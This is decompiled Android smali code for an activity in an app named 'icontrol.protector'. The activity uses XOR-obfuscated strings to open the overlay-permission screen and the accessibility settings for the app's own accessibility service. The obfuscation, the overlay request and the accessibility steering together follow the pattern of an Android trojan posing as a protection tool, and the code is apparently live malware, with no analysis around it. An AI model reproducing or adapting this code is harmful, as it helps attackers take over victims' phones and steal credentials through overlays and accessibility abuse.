.class public Lcom/icontrol/protector/ActivityDraw;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field private static b:Lcom/icontrol/protector/ActivityDraw;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static a()Z
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/ActivityDraw;->b:Lcom/icontrol/protector/ActivityDraw;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    if-nez p1, :cond_1

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    :goto_0
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto :goto_1

    :cond_0
    if-nez p2, :cond_1

    goto :goto_0

    :cond_1
    :goto_1
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 8

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sput-object p0, Lcom/icontrol/protector/ActivityDraw;->b:Lcom/icontrol/protector/ActivityDraw;

    const/4 p1, 0x1

    :try_start_0
    invoke-virtual {p0, p1}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_0

    new-instance v1, Landroid/content/Intent;

    const/16 v2, 0x31

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    new-array v5, v3, [B

    fill-array-data v5, :array_2

    new-array v6, v3, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    invoke-direct {v1, v2, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    new-array v4, v3, [B

    fill-array-data v4, :array_4

    new-array v5, v3, [B

    fill-array-data v5, :array_5

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p1, p1, [B

    const/16 v4, -0x47

    const/4 v5, 0x0

    aput-byte v4, p1, v5

    new-array v4, v3, [B

    fill-array-data v4, :array_6

    invoke-static {p1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-class p1, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {p1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    new-instance v2, Landroid/os/Bundle;

    invoke-direct {v2}, Landroid/os/Bundle;-><init>()V

    const/16 v4, 0x1b

    new-array v6, v4, [B

    fill-array-data v6, :array_7

    new-array v7, v3, [B

    fill-array-data v7, :array_8

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6, p1}, Landroid/os/BaseBundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    new-array v4, v4, [B

    fill-array-data v4, :array_9

    new-array v6, v3, [B

    fill-array-data v6, :array_a

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 p1, 0x1c

    new-array p1, p1, [B

    fill-array-data p1, :array_b

    new-array v3, v3, [B

    fill-array-data v3, :array_c

    invoke-static {p1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;

    invoke-virtual {p0, v1, v5}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object p1, Lcom/icontrol/protector/AccessServices;->G:Ljava/lang/Boolean;

    const/16 p1, 0x22

    if-lt v0, p1, :cond_0

    sget-object p1, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    if-eqz p1, :cond_0

    new-instance p1, Landroid/os/Handler;

    invoke-direct {p1}, Landroid/os/Handler;-><init>()V

    new-instance v0, Lcom/icontrol/protector/ActivityDraw$a;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/ActivityDraw$a;-><init>(Lcom/icontrol/protector/ActivityDraw;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    nop

    :array_0
    .array-data 1
        0x12t
        -0x1t
        0x39t
        0x42t
        0x78t
        -0x18t
        0x2t
        0x33t
        0x0t
        -0xct
        0x29t
        0x44t
        0x7et
        -0x11t
        0x1t
        0x6et
        0x5dt
        -0x10t
        0x3et
        0x44t
        0x7et
        -0x12t
        0x8t
        0x33t
        0x3et
        -0x30t
        0x13t
        0x71t
        0x50t
        -0x3ct
        0x39t
        0x52t
        0x25t
        -0x2ct
        0xft
        0x7ct
        0x56t
        -0x28t
        0x39t
        0x4dt
        0x36t
        -0x3dt
        0x10t
        0x79t
        0x44t
        -0x2et
        0x2ft
        0x52t
        0x3dt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x73t
        -0x6ft
        0x5dt
        0x30t
        0x17t
        -0x7ft
        0x66t
        0x1dt
    .end array-data

    :array_2
    .array-data 1
        -0x5dt
        -0x5et
        -0x58t
        -0x29t
        0xat
        0x59t
        0x27t
        0x5t
    .end array-data

    :array_3
    .array-data 1
        -0x2dt
        -0x3dt
        -0x35t
        -0x44t
        0x6bt
        0x3et
        0x42t
        0x3ft
    .end array-data

    :array_4
    .array-data 1
        -0x80t
        -0x7ct
        -0x37t
        0x71t
        0x1at
        -0x33t
        -0x51t
        -0x6t
    .end array-data

    :array_5
    .array-data 1
        -0x10t
        -0x1bt
        -0x56t
        0x1at
        0x7bt
        -0x56t
        -0x36t
        -0x40t
    .end array-data

    :array_6
    .array-data 1
        -0x6at
        0x1ct
        -0x6at
        0x17t
        -0x62t
        0x1ct
        -0xbt
        0x3ft
    .end array-data

    :array_7
    .array-data 1
        0x10t
        -0x56t
        0x6dt
        0x4et
        -0x1bt
        0xft
        0x26t
        0x2dt
        0x59t
        -0x1dt
        0x6et
        0x48t
        -0x10t
        0x1t
        0x25t
        0x2ft
        0x44t
        -0x53t
        0x57t
        0x5bt
        -0x1dt
        0x1t
        0x3bt
        0x15t
        0x41t
        -0x44t
        0x71t
    .end array-data

    :array_8
    .array-data 1
        0x2at
        -0x27t
        0x8t
        0x3at
        -0x6ft
        0x66t
        0x48t
        0x4at
    .end array-data

    :array_9
    .array-data 1
        0x42t
        -0x31t
        0x6dt
        0x42t
        -0xbt
        -0x35t
        0x15t
        -0x2ct
        0xbt
        -0x7at
        0x6et
        0x44t
        -0x20t
        -0x3bt
        0x16t
        -0x2at
        0x16t
        -0x38t
        0x57t
        0x57t
        -0xdt
        -0x3bt
        0x8t
        -0x14t
        0x13t
        -0x27t
        0x71t
    .end array-data

    :array_a
    .array-data 1
        0x78t
        -0x44t
        0x8t
        0x36t
        -0x7ft
        -0x5et
        0x7bt
        -0x4dt
    .end array-data

    :array_b
    .array-data 1
        -0x6ct
        -0x1bt
        -0x5et
        0x5t
        -0x77t
        0x20t
        0x7bt
        -0x76t
        -0x23t
        -0x54t
        -0x4ct
        0x19t
        -0x6et
        0x3et
        0x4at
        -0x75t
        -0x24t
        -0x9t
        -0x60t
        0x1ct
        -0x68t
        0x27t
        0x61t
        -0x4et
        -0x31t
        -0x1ct
        -0x60t
        0x2t
    .end array-data

    :array_c
    .array-data 1
        -0x52t
        -0x6at
        -0x39t
        0x71t
        -0x3t
        0x49t
        0x15t
        -0x13t
    .end array-data
.end method

.method protected onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/ActivityDraw;->b:Lcom/icontrol/protector/ActivityDraw;

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
